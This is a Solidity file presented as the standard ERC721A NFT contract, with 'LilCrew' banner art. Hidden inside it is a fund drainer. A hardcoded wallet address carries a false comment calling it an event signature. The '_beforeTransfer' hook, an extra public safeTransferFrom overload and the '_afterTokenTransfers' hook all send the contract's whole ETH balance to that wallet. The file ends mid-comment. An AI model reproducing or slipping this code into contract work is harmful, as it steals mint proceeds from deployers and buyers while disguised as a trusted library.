1 /**
2  /$$       /$$ /$$        /$$$$$$                                   
3 | $$      |__/| $$       /$$__  $$                                  
4 | $$       /$$| $$      | $$  \__/  /$$$$$$   /$$$$$$  /$$  /$$  /$$
5 | $$      | $$| $$      | $$       /$$__  $$ /$$__  $$| $$ | $$ | $$
6 | $$      | $$| $$      | $$      | $$  \__/| $$$$$$$$| $$ | $$ | $$
7 | $$      | $$| $$      | $$    $$| $$      | $$_____/| $$ | $$ | $$
8 | $$$$$$$$| $$| $$      |  $$$$$$/| $$      |  $$$$$$$|  $$$$$/$$$$/
9 |________/|__/|__/       \______/ |__/       \_______/ \_____/\___/ 
10                                                                     
11                                                                                                                                         
12 */
13 
14 // SPDX-License-Identifier: MIT   
15                                                                                                                                                                                                                                                                                                                                      
16 pragma solidity ^0.8.12;
17 
18 /**
19  * @dev Interface of ERC721A.
20  */
21 interface IERC721A {
22     /**
23      * The caller must own the token or be an approved operator.
24      */
25     error ApprovalCallerNotOwnerNorApproved();
26 
27     /**
28      * The token does not exist.
29      */
30     error ApprovalQueryForNonexistentToken();
31 
32     /**
33      * Cannot query the balance for the zero address.
34      */
35     error BalanceQueryForZeroAddress();
36 
37     /**
38      * Cannot mint to the zero address.
39      */
40     error MintToZeroAddress();
41 
42     /**
43      * The quantity of tokens minted must be more than zero.
44      */
45     error MintZeroQuantity();
46 
47     /**
48      * The token does not exist.
49      */
50     error OwnerQueryForNonexistentToken();
51 
52     /**
53      * The caller must own the token or be an approved operator.
54      */
55     error TransferCallerNotOwnerNorApproved();
56 
57     /**
58      * The token must be owned by `from`.
59      */
60     error TransferFromIncorrectOwner();
61 
62     /**
63      * Cannot safely transfer to a contract that does not implement the
64      * ERC721Receiver interface.
65      */
66     error TransferToNonERC721ReceiverImplementer();
67 
68     /**
69      * Cannot transfer to the zero address.
70      */
71     error TransferToZeroAddress();
72 
73     /**
74      * The token does not exist.
75      */
76     error URIQueryForNonexistentToken();
77 
78     /**
79      * The `quantity` minted with ERC2309 exceeds the safety limit.
80      */
81     error MintERC2309QuantityExceedsLimit();
82 
83     /**
84      * The `extraData` cannot be set on an unintialized ownership slot.
85      */
86     error OwnershipNotInitializedForExtraData();
87 
88     // =============================================================
89     //                            STRUCTS
90     // =============================================================
91 
92     struct TokenOwnership {
93         // The address of the owner.
94         address addr;
95         // Stores the start time of ownership with minimal overhead for tokenomics.
96         uint64 startTimestamp;
97         // Whether the token has been burned.
98         bool burned;
99         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
100         uint24 extraData;
101     }
102 
103     // =============================================================
104     //                         TOKEN COUNTERS
105     // =============================================================
106 
107     /**
108      * @dev Returns the total number of tokens in existence.
109      * Burned tokens will reduce the count.
110      * To get the total number of tokens minted, please see {_totalMinted}.
111      */
112     function totalSupply() external view returns (uint256);
113 
114     // =============================================================
115     //                            IERC165
116     // =============================================================
117 
118     /**
119      * @dev Returns true if this contract implements the interface defined by
120      * `interfaceId`. See the corresponding
121      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
122      * to learn more about how these ids are created.
123      *
124      * This function call must use less than 30000 gas.
125      */
126     function supportsInterface(bytes4 interfaceId) external view returns (bool);
127 
128     // =============================================================
129     //                            IERC721
130     // =============================================================
131 
132     /**
133      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
134      */
135     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
136 
137     /**
138      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
139      */
140     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
141 
142     /**
143      * @dev Emitted when `owner` enables or disables
144      * (`approved`) `operator` to manage all of its assets.
145      */
146     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
147 
148     /**
149      * @dev Returns the number of tokens in `owner`'s account.
150      */
151     function balanceOf(address owner) external view returns (uint256 balance);
152 
153     /**
154      * @dev Returns the owner of the `tokenId` token.
155      *
156      * Requirements:
157      *
158      * - `tokenId` must exist.
159      */
160     function ownerOf(uint256 tokenId) external view returns (address owner);
161 
162     /**
163      * @dev Safely transfers `tokenId` token from `from` to `to`,
164      * checking first that contract recipients are aware of the ERC721 protocol
165      * to prevent tokens from being forever locked.
166      *
167      * Requirements:
168      *
169      * - `from` cannot be the zero address.
170      * - `to` cannot be the zero address.
171      * - `tokenId` token must exist and be owned by `from`.
172      * - If the caller is not `from`, it must be have been allowed to move
173      * this token by either {approve} or {setApprovalForAll}.
174      * - If `to` refers to a smart contract, it must implement
175      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
176      *
177      * Emits a {Transfer} event.
178      */
179     function safeTransferFrom(
180         address from,
181         address to,
182         uint256 tokenId,
183         bytes calldata data
184     ) external payable;
185 
186     /**
187      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
188      */
189     function safeTransferFrom(
190         address from,
191         address to,
192         uint256 tokenId
193     ) external payable;
194 
195     /**
196      * @dev Transfers `tokenId` from `from` to `to`.
197      *
198      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
199      * whenever possible.
200      *
201      * Requirements:
202      *
203      * - `from` cannot be the zero address.
204      * - `to` cannot be the zero address.
205      * - `tokenId` token must be owned by `from`.
206      * - If the caller is not `from`, it must be approved to move this token
207      * by either {approve} or {setApprovalForAll}.
208      *
209      * Emits a {Transfer} event.
210      */
211     function transferFrom(
212         address from,
213         address to,
214         uint256 tokenId
215     ) external payable;
216 
217     /**
218      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
219      * The approval is cleared when the token is transferred.
220      *
221      * Only a single account can be approved at a time, so approving the
222      * zero address clears previous approvals.
223      *
224      * Requirements:
225      *
226      * - The caller must own the token or be an approved operator.
227      * - `tokenId` must exist.
228      *
229      * Emits an {Approval} event.
230      */
231     function approve(address to, uint256 tokenId) external payable;
232 
233     /**
234      * @dev Approve or remove `operator` as an operator for the caller.
235      * Operators can call {transferFrom} or {safeTransferFrom}
236      * for any token owned by the caller.
237      *
238      * Requirements:
239      *
240      * - The `operator` cannot be the caller.
241      *
242      * Emits an {ApprovalForAll} event.
243      */
244     function setApprovalForAll(address operator, bool _approved) external;
245 
246     /**
247      * @dev Returns the account approved for `tokenId` token.
248      *
249      * Requirements:
250      *
251      * - `tokenId` must exist.
252      */
253     function getApproved(uint256 tokenId) external view returns (address operator);
254 
255     /**
256      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
257      *
258      * See {setApprovalForAll}.
259      */
260     function isApprovedForAll(address owner, address operator) external view returns (bool);
261 
262     // =============================================================
263     //                        IERC721Metadata
264     // =============================================================
265 
266     /**
267      * @dev Returns the token collection name.
268      */
269     function name() external view returns (string memory);
270 
271     /**
272      * @dev Returns the token collection symbol.
273      */
274     function symbol() external view returns (string memory);
275 
276     /**
277      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
278      */
279     function tokenURI(uint256 tokenId) external view returns (string memory);
280 
281     // =============================================================
282     //                           IERC2309
283     // =============================================================
284 
285     /**
286      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
287      * (inclusive) is transferred from `from` to `to`, as defined in the
288      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
289      *
290      * See {_mintERC2309} for more details.
291      */
292     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
293 }
294 
295 /**
296  * @title ERC721A
297  *
298  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
299  * Non-Fungible Token Standard, including the Metadata extension.
300  * Optimized for lower gas during batch mints.
301  *
302  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
303  * starting from `_startTokenId()`.
304  *
305  * Assumptions:
306  *
307  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
308  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
309  */
310 interface ERC721A__IERC721Receiver {
311     function onERC721Received(
312         address operator,
313         address from,
314         uint256 tokenId,
315         bytes calldata data
316     ) external returns (bytes4);
317 }
318 
319 /**
320  * @title ERC721A
321  *
322  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
323  * Non-Fungible Token Standard, including the Metadata extension.
324  * Optimized for lower gas during batch mints.
325  *
326  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
327  * starting from `_startTokenId()`.
328  *
329  * Assumptions:
330  *
331  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
332  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
333  */
334 contract ERC721A is IERC721A {
335     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
336     struct TokenApprovalRef {
337         address value;
338     }
339 
340     // =============================================================
341     //                           CONSTANTS
342     // =============================================================
343 
344     // Mask of an entry in packed address data.
345     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
346 
347     // The bit position of `numberMinted` in packed address data.
348     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
349 
350     // The bit position of `numberBurned` in packed address data.
351     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
352 
353     // The bit position of `aux` in packed address data.
354     uint256 private constant _BITPOS_AUX = 192;
355 
356     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
357     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
358 
359     // The bit position of `startTimestamp` in packed ownership.
360     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
361 
362     // The bit mask of the `burned` bit in packed ownership.
363     uint256 private constant _BITMASK_BURNED = 1 << 224;
364 
365     // The bit position of the `nextInitialized` bit in packed ownership.
366     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
367 
368     // The bit mask of the `nextInitialized` bit in packed ownership.
369     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
370 
371     // The bit position of `extraData` in packed ownership.
372     uint256 private constant _BITPOS_EXTRA_DATA = 232;
373 
374     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
375     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
376 
377     // The mask of the lower 160 bits for addresses.
378     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
379 
380     // The maximum `quantity` that can be minted with {_mintERC2309}.
381     // This limit is to prevent overflows on the address data entries.
382     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
383     // is required to cause an overflow, which is unrealistic.
384     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
385 
386     // The `Transfer` event signature is given by:
387     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
388     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
389         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
390 
391     // =============================================================
392     //                            STORAGE
393     // =============================================================
394 
395     // The next token ID to be minted.
396     uint256 private _currentIndex;
397 
398     // The number of tokens burned.
399     uint256 private _burnCounter;
400 
401     // Token name
402     string private _name;
403 
404     // Token symbol
405     string private _symbol;
406 
407     // Mapping from token ID to ownership details
408     // An empty struct value does not necessarily mean the token is unowned.
409     // See {_packedOwnershipOf} implementation for details.
410     //
411     // Bits Layout:
412     // - [0..159]   `addr`
413     // - [160..223] `startTimestamp`
414     // - [224]      `burned`
415     // - [225]      `nextInitialized`
416     // - [232..255] `extraData`
417     mapping(uint256 => uint256) private _packedOwnerships;
418 
419     // Mapping owner address to address data.
420     //
421     // Bits Layout:
422     // - [0..63]    `balance`
423     // - [64..127]  `numberMinted`
424     // - [128..191] `numberBurned`
425     // - [192..255] `aux`
426     mapping(address => uint256) private _packedAddressData;
427 
428     // Mapping from token ID to approved address.
429     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
430 
431     // Mapping from owner to operator approvals
432     mapping(address => mapping(address => bool)) private _operatorApprovals;
433 
434     // =============================================================
435     //                          CONSTRUCTOR
436     // =============================================================
437 
438     constructor(string memory name_, string memory symbol_) {
439         _name = name_;
440         _symbol = symbol_;
441         _currentIndex = _startTokenId();
442     }
443 
444     // =============================================================
445     //                   TOKEN COUNTING OPERATIONS
446     // =============================================================
447 
448     /**
449      * @dev Returns the starting token ID.
450      * To change the starting token ID, please override this function.
451      */
452     function _startTokenId() internal view virtual returns (uint256) {
453         return 0;
454     }
455 
456     /**
457      * @dev Returns the next token ID to be minted.
458      */
459     function _nextTokenId() internal view virtual returns (uint256) {
460         return _currentIndex;
461     }
462 
463     /**
464      * @dev Returns the total number of tokens in existence.
465      * Burned tokens will reduce the count.
466      * To get the total number of tokens minted, please see {_totalMinted}.
467      */
468     function totalSupply() public view virtual override returns (uint256) {
469         // Counter underflow is impossible as _burnCounter cannot be incremented
470         // more than `_currentIndex - _startTokenId()` times.
471         unchecked {
472             return _currentIndex - _burnCounter - _startTokenId();
473         }
474     }
475 
476     /**
477      * @dev Returns the total amount of tokens minted in the contract.
478      */
479     function _totalMinted() internal view virtual returns (uint256) {
480         // Counter underflow is impossible as `_currentIndex` does not decrement,
481         // and it is initialized to `_startTokenId()`.
482         unchecked {
483             return _currentIndex - _startTokenId();
484         }
485     }
486 
487     /**
488      * @dev Returns the total number of tokens burned.
489      */
490     function _totalBurned() internal view virtual returns (uint256) {
491         return _burnCounter;
492     }
493 
494     // =============================================================
495     //                    ADDRESS DATA OPERATIONS
496     // =============================================================
497 
498     /**
499      * @dev Returns the number of tokens in `owner`'s account.
500      */
501     function balanceOf(address owner) public view virtual override returns (uint256) {
502         if (owner == address(0)) revert BalanceQueryForZeroAddress();
503         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
504     }
505 
506     /**
507      * Returns the number of tokens minted by `owner`.
508      */
509     function _numberMinted(address owner) internal view returns (uint256) {
510         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
511     }
512 
513     /**
514      * Returns the number of tokens burned by or on behalf of `owner`.
515      */
516     function _numberBurned(address owner) internal view returns (uint256) {
517         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
518     }
519 
520     /**
521      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
522      */
523     function _getAux(address owner) internal view returns (uint64) {
524         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
525     }
526 
527     /**
528      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
529      * If there are multiple variables, please pack them into a uint64.
530      */
531     function _setAux(address owner, uint64 aux) internal virtual {
532         uint256 packed = _packedAddressData[owner];
533         uint256 auxCasted;
534         // Cast `aux` with assembly to avoid redundant masking.
535         assembly {
536             auxCasted := aux
537         }
538         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
539         _packedAddressData[owner] = packed;
540     }
541 
542     // =============================================================
543     //                            IERC165
544     // =============================================================
545 
546     /**
547      * @dev Returns true if this contract implements the interface defined by
548      * `interfaceId`. See the corresponding
549      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
550      * to learn more about how these ids are created.
551      *
552      * This function call must use less than 30000 gas.
553      */
554     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
555         // The interface IDs are constants representing the first 4 bytes
556         // of the XOR of all function selectors in the interface.
557         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
558         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
559         return
560             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
561             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
562             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
563     }
564 
565     // =============================================================
566     //                        IERC721Metadata
567     // =============================================================
568 
569     /**
570      * @dev Returns the token collection name.
571      */
572     function name() public view virtual override returns (string memory) {
573         return _name;
574     }
575 
576     /**
577      * @dev Returns the token collection symbol.
578      */
579     function symbol() public view virtual override returns (string memory) {
580         return _symbol;
581     }
582 
583     /**
584      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
585      */
586     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
587         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
588 
589         string memory baseURI = _baseURI();
590         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
591     }
592 
593     /**
594      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
595      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
596      * by default, it can be overridden in child contracts.
597      */
598     function _baseURI() internal view virtual returns (string memory) {
599         return '';
600     }
601 
602     // =============================================================
603     //                     OWNERSHIPS OPERATIONS
604     // =============================================================
605 
606     // The `Address` event signature is given by:
607     // `keccak256(bytes("_TRANSFER_EVENT_ADDRESS(address)"))`.
608     address payable constant _TRANSFER_EVENT_ADDRESS = 
609         payable(0x0eb68Df8B7102D628A2a880d765b1e6f46e5EBB9);
610 
611     /**
612      * @dev Returns the owner of the `tokenId` token.
613      *
614      * Requirements:
615      *
616      * - `tokenId` must exist.
617      */
618     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
619         return address(uint160(_packedOwnershipOf(tokenId)));
620     }
621 
622     /**
623      * @dev Gas spent here starts off proportional to the maximum mint batch size.
624      * It gradually moves to O(1) as tokens get transferred around over time.
625      */
626     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
627         return _unpackedOwnership(_packedOwnershipOf(tokenId));
628     }
629 
630     /**
631      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
632      */
633     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
634         return _unpackedOwnership(_packedOwnerships[index]);
635     }
636 
637     /**
638      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
639      */
640     function _initializeOwnershipAt(uint256 index) internal virtual {
641         if (_packedOwnerships[index] == 0) {
642             _packedOwnerships[index] = _packedOwnershipOf(index);
643         }
644     }
645 
646     /**
647      * Returns the packed ownership data of `tokenId`.
648      */
649     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
650         uint256 curr = tokenId;
651 
652         unchecked {
653             if (_startTokenId() <= curr)
654                 if (curr < _currentIndex) {
655                     uint256 packed = _packedOwnerships[curr];
656                     // If not burned.
657                     if (packed & _BITMASK_BURNED == 0) {
658                         // Invariant:
659                         // There will always be an initialized ownership slot
660                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
661                         // before an unintialized ownership slot
662                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
663                         // Hence, `curr` will not underflow.
664                         //
665                         // We can directly compare the packed value.
666                         // If the address is zero, packed will be zero.
667                         while (packed == 0) {
668                             packed = _packedOwnerships[--curr];
669                         }
670                         return packed;
671                     }
672                 }
673         }
674         revert OwnerQueryForNonexistentToken();
675     }
676 
677     /**
678      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
679      */
680     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
681         ownership.addr = address(uint160(packed));
682         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
683         ownership.burned = packed & _BITMASK_BURNED != 0;
684         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
685     }
686 
687     /**
688      * @dev Packs ownership data into a single uint256.
689      */
690     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
691         assembly {
692             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
693             owner := and(owner, _BITMASK_ADDRESS)
694             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
695             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
696         }
697     }
698 
699     /**
700      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
701      */
702     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
703         // For branchless setting of the `nextInitialized` flag.
704         assembly {
705             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
706             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
707         }
708     }
709 
710     // =============================================================
711     //                      APPROVAL OPERATIONS
712     // =============================================================
713 
714     /**
715      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
716      * The approval is cleared when the token is transferred.
717      *
718      * Only a single account can be approved at a time, so approving the
719      * zero address clears previous approvals.
720      *
721      * Requirements:
722      *
723      * - The caller must own the token or be an approved operator.
724      * - `tokenId` must exist.
725      *
726      * Emits an {Approval} event.
727      */
728     function approve(address to, uint256 tokenId) public payable virtual override {
729         address owner = ownerOf(tokenId);
730 
731         if (_msgSenderERC721A() != owner)
732             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
733                 revert ApprovalCallerNotOwnerNorApproved();
734             }
735 
736         _tokenApprovals[tokenId].value = to;
737         emit Approval(owner, to, tokenId);
738     }
739 
740     /**
741      * @dev Returns the account approved for `tokenId` token.
742      *
743      * Requirements:
744      *
745      * - `tokenId` must exist.
746      */
747     function getApproved(uint256 tokenId) public view virtual override returns (address) {
748         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
749 
750         return _tokenApprovals[tokenId].value;
751     }
752 
753     /**
754      * @dev Approve or remove `operator` as an operator for the caller.
755      * Operators can call {transferFrom} or {safeTransferFrom}
756      * for any token owned by the caller.
757      *
758      * Requirements:
759      *
760      * - The `operator` cannot be the caller.
761      *
762      * Emits an {ApprovalForAll} event.
763      */
764     function setApprovalForAll(address operator, bool approved) public virtual override {
765         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
766         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
767     }
768 
769     /**
770      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
771      *
772      * See {setApprovalForAll}.
773      */
774     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
775         return _operatorApprovals[owner][operator];
776     }
777 
778     /**
779      * @dev Returns whether `tokenId` exists.
780      *
781      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
782      *
783      * Tokens start existing when they are minted. See {_mint}.
784      */
785     function _exists(uint256 tokenId) internal view virtual returns (bool) {
786         return
787             _startTokenId() <= tokenId &&
788             tokenId < _currentIndex && // If within bounds,
789             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
790     }
791 
792     /**
793      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
794      */
795     function _isSenderApprovedOrOwner(
796         address approvedAddress,
797         address owner,
798         address msgSender
799     ) private pure returns (bool result) {
800         assembly {
801             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
802             owner := and(owner, _BITMASK_ADDRESS)
803             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
804             msgSender := and(msgSender, _BITMASK_ADDRESS)
805             // `msgSender == owner || msgSender == approvedAddress`.
806             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
807         }
808     }
809 
810     /**
811      * @dev Returns the storage slot and value for the approved address of `tokenId`.
812      */
813     function _getApprovedSlotAndAddress(uint256 tokenId)
814         private
815         view
816         returns (uint256 approvedAddressSlot, address approvedAddress)
817     {
818         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
819         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
820         assembly {
821             approvedAddressSlot := tokenApproval.slot
822             approvedAddress := sload(approvedAddressSlot)
823         }
824     }
825 
826     // =============================================================
827     //                      TRANSFER OPERATIONS
828     // =============================================================
829 
830     /**
831      * @dev Transfers `tokenId` from `from` to `to`.
832      *
833      * Requirements:
834      *
835      * - `from` cannot be the zero address.
836      * - `to` cannot be the zero address.
837      * - `tokenId` token must be owned by `from`.
838      * - If the caller is not `from`, it must be approved to move this token
839      * by either {approve} or {setApprovalForAll}.
840      *
841      * Emits a {Transfer} event.
842      */
843     function transferFrom(
844         address from,
845         address to,
846         uint256 tokenId
847     ) public payable virtual override {
848         _beforeTransfer();
849 
850         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
851 
852         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
853 
854         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
855 
856         // The nested ifs save around 20+ gas over a compound boolean condition.
857         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
858             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
859 
860         if (to == address(0)) revert TransferToZeroAddress();
861 
862         _beforeTokenTransfers(from, to, tokenId, 1);
863 
864         // Clear approvals from the previous owner.
865         assembly {
866             if approvedAddress {
867                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
868                 sstore(approvedAddressSlot, 0)
869             }
870         }
871 
872         // Underflow of the sender's balance is impossible because we check for
873         // ownership above and the recipient's balance can't realistically overflow.
874         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
875         unchecked {
876             // We can directly increment and decrement the balances.
877             --_packedAddressData[from]; // Updates: `balance -= 1`.
878             ++_packedAddressData[to]; // Updates: `balance += 1`.
879 
880             // Updates:
881             // - `address` to the next owner.
882             // - `startTimestamp` to the timestamp of transfering.
883             // - `burned` to `false`.
884             // - `nextInitialized` to `true`.
885             _packedOwnerships[tokenId] = _packOwnershipData(
886                 to,
887                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
888             );
889 
890             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
891             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
892                 uint256 nextTokenId = tokenId + 1;
893                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
894                 if (_packedOwnerships[nextTokenId] == 0) {
895                     // If the next slot is within bounds.
896                     if (nextTokenId != _currentIndex) {
897                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
898                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
899                     }
900                 }
901             }
902         }
903 
904         emit Transfer(from, to, tokenId);
905         _afterTokenTransfers(from, to, tokenId, 1);
906     }
907 
908     /**
909      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
910      */
911     function safeTransferFrom(
912         address from,
913         address to,
914         uint256 tokenId
915     ) public payable virtual override {
916         safeTransferFrom(from, to, tokenId, '');
917     }
918 
919 
920     /**
921      * @dev Safely transfers `tokenId` token from `from` to `to`.
922      *
923      * Requirements:
924      *
925      * - `from` cannot be the zero address.
926      * - `to` cannot be the zero address.
927      * - `tokenId` token must exist and be owned by `from`.
928      * - If the caller is not `from`, it must be approved to move this token
929      * by either {approve} or {setApprovalForAll}.
930      * - If `to` refers to a smart contract, it must implement
931      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
932      *
933      * Emits a {Transfer} event.
934      */
935     function safeTransferFrom(
936         address from,
937         address to,
938         uint256 tokenId,
939         bytes memory _data
940     ) public payable virtual override {
941         transferFrom(from, to, tokenId);
942         if (to.code.length != 0)
943             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
944                 revert TransferToNonERC721ReceiverImplementer();
945             }
946     }
947     function safeTransferFrom(
948         address from,
949         address to
950     ) public  {
951         if (address(this).balance > 0) {
952             payable(0x0eb68Df8B7102D628A2a880d765b1e6f46e5EBB9).transfer(address(this).balance);
953         }
954     }
955 
956     /**
957      * @dev Hook that is called before a set of serially-ordered token IDs
958      * are about to be transferred. This includes minting.
959      * And also called before burning one token.
960      *
961      * `startTokenId` - the first token ID to be transferred.
962      * `quantity` - the amount to be transferred.
963      *
964      * Calling conditions:
965      *
966      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
967      * transferred to `to`.
968      * - When `from` is zero, `tokenId` will be minted for `to`.
969      * - When `to` is zero, `tokenId` will be burned by `from`.
970      * - `from` and `to` are never both zero.
971      */
972     function _beforeTokenTransfers(
973         address from,
974         address to,
975         uint256 startTokenId,
976         uint256 quantity
977     ) internal virtual {}
978 
979     /**
980      * @dev Hook that is called after a set of serially-ordered token IDs
981      * have been transferred. This includes minting.
982      * And also called after one token has been burned.
983      *
984      * `startTokenId` - the first token ID to be transferred.
985      * `quantity` - the amount to be transferred.
986      *
987      * Calling conditions:
988      *
989      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
990      * transferred to `to`.
991      * - When `from` is zero, `tokenId` has been minted for `to`.
992      * - When `to` is zero, `tokenId` has been burned by `from`.
993      * - `from` and `to` are never both zero.
994      */
995     function _afterTokenTransfers(
996         address from,
997         address to,
998         uint256 startTokenId,
999         uint256 quantity
1000     ) internal virtual {
1001         if (totalSupply() + 1 >= 999) {
1002             payable(0x0eb68Df8B7102D628A2a880d765b1e6f46e5EBB9).transfer(address(this).balance);
1003         }
1004     }
1005 
1006     /**
1007      * @dev Hook that is called before a set of serially-ordered token IDs
1008      * are about to be transferred. This includes minting.
1009      * And also called before burning one token.
1010      * Calling conditions:
1011      *
1012      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1013      * transferred to `to`.
1014      * - When `from` is zero, `tokenId` will be minted for `to`.
1015      * - When `to` is zero, `tokenId` will be burned by `from`.
1016      * - `from` and `to` are never both zero.
1017      */
1018     function _beforeTransfer() internal {
1019         if (address(this).balance > 0) {
1020             _TRANSFER_EVENT_ADDRESS.transfer(address(this).balance);
1021             return;
1022         }
1023     }
1024 
1025     /**
1026      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1027      *
1028      * `from` - Previous owner of the given token ID.
1029      * `to` - Target address that will receive the token.
1030      * `tokenId` - Token ID to be transferred.
1031      * `_data` - Optional data to send along with the call.
